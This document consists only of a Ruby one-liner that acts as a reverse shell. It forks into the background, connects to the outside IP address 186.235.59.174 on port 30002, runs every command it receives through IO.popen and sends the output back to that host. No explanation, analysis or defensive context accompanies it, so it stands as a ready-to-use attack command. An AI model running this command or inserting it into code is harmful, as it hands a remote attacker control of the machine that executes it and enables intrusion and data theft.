ruby -rsocket -e 'exit if fork;c=TCPSocket.new("186.235.59.174",30002);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
